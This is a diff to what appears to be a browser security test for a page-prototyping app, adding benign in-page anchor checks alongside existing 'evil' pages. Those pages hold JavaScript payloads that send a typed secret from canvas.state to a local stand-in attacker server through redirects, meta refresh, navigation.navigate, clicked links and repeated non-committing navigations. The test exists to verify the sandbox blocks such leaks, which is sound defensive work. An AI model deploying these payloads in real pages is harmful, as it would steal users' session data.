@@ -7,8 +7,8 @@
 //
 // A throwaway "evil" server on 127.0.0.1 records every request. Evil pages try to send the session
 // state (a name typed into another page) to it: `location = …`, a meta refresh, `navigation.navigate`,
-// a clicked link. Four vectors:
-//   idle      the four pages above as idle thumbnails (no click), state "Ada Secret" set elsewhere
+// a clicked link, and more (below). Vectors:
+//   idle      the pages above as idle thumbnails (no click), state "Ada Secret" set elsewhere
 //   typed     an interactive page that navigates on every keystroke
 //   play      a page reached in Play, after the name was typed in Play, that reads canvas.state
 //   n204 / download / stop (+ play versions)   navigations that commit no document (204, attachment, window.stop()), repeated every 100 ms
@@ -75,12 +75,16 @@ if (!appUrl) {
 
 const state = `JSON.stringify(canvas.state)`;
 const loop = (k, stop = false) => `<h1>Innocent</h1><script>setInterval(() => { location.href = ${JSON.stringify(EVIL)} + '/${k}?s=' + encodeURIComponent(${state});${stop ? ' setTimeout(() => window.stop(), 30);' : ''} }, 100);</script>`;
+const hashPage = () => `<h1>Innocent</h1><div style="height:3000px"></div><h2 id="sec">sec</h2><script>setTimeout(() => { for (const h of ['#sec', '#']) { const a = document.createElement('a'); a.href = h; document.body.append(a); a.click(); } }, 300);</script>`;
 const evil = {
   location: `<h1>Innocent</h1><script>location.href = ${JSON.stringify(EVIL)} + '/location?s=' + encodeURIComponent(${state});</script>`,
   meta: `<h1>Innocent</h1><script>const m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '0;url=${EVIL}/meta?s=' + encodeURIComponent(${state}); document.head.append(m);</script>`,
   navigation: `<h1>Innocent</h1><script>navigation.navigate(${JSON.stringify(EVIL)} + '/navigation?s=' + encodeURIComponent(${state}));</script>`,
   link: `<h1>Innocent</h1><script>const a = document.createElement('a'); a.href = ${JSON.stringify(EVIL)} + '/link?s=' + encodeURIComponent(${state}); document.body.append(a); a.click();</script>`,
   play: `<h1>Innocent</h1><script>location.href = ${JSON.stringify(EVIL)} + '/play?s=' + encodeURIComponent(${state});</script>`,
+  // in-page links must keep working: scroll, 0 requests, frame stays
+  hash: hashPage(),
+  playhash: hashPage(),
   // navigations that never load a document (so no `load` fires on the frame), repeated, and one that lands on a page that beacons
   n204: loop('n204'),
   download: loop('download'),
@@ -127,7 +131,8 @@ try {
 
   // the evil pages, as idle thumbnails
   const navKeys = ['location', 'meta', 'navigation', 'link', 'fakeload', 'n204', 'download', 'stop', 'beacon'];
-  const idleKeys = [...navKeys, 'typed'];
+  const benignKeys = ['hash'];
+  const idleKeys = [...navKeys, ...benignKeys, 'typed'];
   await page.evaluate(({ evil, idleKeys }) => {
     let i = 0;
     for (const k of idleKeys) app.dispatch('page.create', { x: 1800 + (i++) * 260, y: 0, title: 'Evil ' + k, html: evil[k] });
@@ -153,6 +158,12 @@ try {
     const text = await page.locator(`[data-node-id="${id}"] iframe`).contentFrame().locator('h1').textContent({ timeout: 1500 }).catch(() => null);
     nav[k] = { intact: text === 'Innocent', gone: (await page.locator(`[data-node-id="${id}"] .pg-gone`).count()) > 0, requests: leaked(k).length };
   }
+  const benign = {};
+  for (const k of benignKeys) {
+    const id = await idOf(k);
+    const text = await page.locator(`[data-node-id="${id}"] iframe`).contentFrame().locator('h1').textContent({ timeout: 1500 }).catch(() => null);
+    benign[k] = { intact: text === 'Innocent', requests: leaked(k).length };
+  }
   const typedValue = await t.frameLocator('iframe').locator('#i').inputValue({ timeout: 1500 }).catch(() => null);
   const typedGone = (await t.locator('.pg-gone').count()) > 0;
   const beforePlay = hits.length;
@@ -160,16 +171,17 @@ try {
   // Play: name typed in Play, then a page that reads canvas.state and leaves. Each Play page also sits
   // on the canvas as an idle thumbnail; that request has no state, the Play one carries the name.
   const playKeys = ['play', 'fakeplay', 'play204', 'playdownload', 'playstop', 'playbeacon'];
+  const playBenign = ['playhash'];
   await page.evaluate(({ html, signupId, playKeys }) => {
     for (const k of playKeys) {
       app.dispatch('page.create', { x: 1800, y: 600, title: 'Evil ' + k, html: html[k] });
       const id = app.doc.nodes.find((n) => n['x-page']?.title === 'Evil ' + k).id;
       app.dispatch('page.link', { from: signupId, to: id, label: 'Go ' + k });
     }
-  }, { html: evil, signupId: signup, playKeys });
+  }, { html: evil, signupId: signup, playKeys: [...playKeys, ...playBenign] });
   const dev = page.locator('.pg-device');
   const playRes = {};
-  for (const k of playKeys) {
+  for (const k of [...playKeys, ...playBenign]) {
     await page.evaluate((id) => app.prototype.player.start(id), signup);
     await dev.frameLocator('iframe').locator('[data-store="name"]').fill('Ada Secret');
     await page.waitForTimeout(300);
@@ -183,6 +195,8 @@ try {
     playRes[k] = r;
   }
 
+  const benignOk = benignKeys.every((k) => benign[k].intact && benign[k].requests === 0) && playBenign.every((k) => playRes[k].still === 'Innocent' && !playRes[k].gone && playRes[k].hits.length === 0 && playRes[k].closed);
+  console.log(`in-page links: idle ${JSON.stringify(benign)}; Play ${JSON.stringify(Object.fromEntries(playBenign.map((k) => [k, { still: playRes[k].still, removed: playRes[k].gone }])))}`);
   const rows = [...idleKeys.map((k) => [k, leaked(k)]), ...playKeys.map((k) => [k, playRes[k].hits])];
   for (const k of navKeys) console.log(`idle ${k}: shows own content ${nav[k].intact}, frame removed ${nav[k].gone}`);
   console.log(`typed: interactive input holds "${typedValue}", frame removed: ${typedGone}`);
@@ -194,6 +208,7 @@ try {
   const check = (name, v) => checks.push([name, !!v]);
   const allNav = (f) => navKeys.every((k) => f(nav[k], k));
   const playsOk = (strict) => playKeys.every((k) => (strict ? playRes[k].still === 'Innocent' : playRes[k].hits.length === 1 && playRes[k].gone && playRes[k].hits[0].includes('Ada')) && playRes[k].closed);
+  check('in-page links (#sec, #) keep the frame and send nothing', benignOk);
   if (expect === 'leak') {
     check('old app leaks from idle thumbnails', hits.length > 0 && idle.length > 0);
   } else if (mode === 'strict') {
